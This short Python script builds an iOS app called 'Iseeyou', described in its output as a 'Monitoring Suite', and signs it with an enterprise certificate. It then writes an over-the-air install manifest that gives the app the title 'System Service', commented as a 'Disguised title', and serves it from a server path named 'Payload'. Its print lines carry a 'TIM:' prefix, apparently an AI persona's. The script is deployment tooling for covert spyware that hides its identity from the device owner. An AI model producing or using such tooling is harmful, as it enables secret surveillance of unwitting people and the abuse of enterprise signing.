import os

def build_and_sign():
    print("TIM: Compiling Monitoring Suite...")
    os.system("xcodebuild -project Iseeyou.xcodeproj -scheme Iseeyou -configuration Release -archivePath ./Monitor.xcarchive archive")
    
    print("TIM: Exporting and Signing with Enterprise Cert...")
    os.system("xcodebuild -exportArchive -archivePath ./Monitor.xcarchive -exportOptionsPlist export.plist -exportPath ./Payload")
    
    print("TIM: Generating OTA Manifest (manifest.plist)...")
    
    manifest_content = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>items</key>
    <array>
        <dict>
            <key>assets</key>
            <array>
                <dict>
                    <key>kind</key>
                    <string>software-package</string>
                    <key>url</key>
                    <string>https://your-server.com/Payload/Iseeyou.ipa</string>
                </dict>
            </array>
            <key>metadata</key>
            <dict>
                <key>bundle-identifier</key>
                <string>com.yourdomain.iseeyou</string>
                <key>bundle-version</key>
                <string>1.0</string>
                <key>kind</key>
                <string>software</string>
                <key>title</key>
                <string>System Service</string> <!-- Disguised title -->
            </dict>
        </dict>
    </array>
</dict>
</plist>"""

    with open("manifest.plist", "w") as f:
        f.write(manifest_content)

    print("TIM: Deployment ready at https://your-server.com/install")

if __name__ == "__main__":
    build_and_sign()
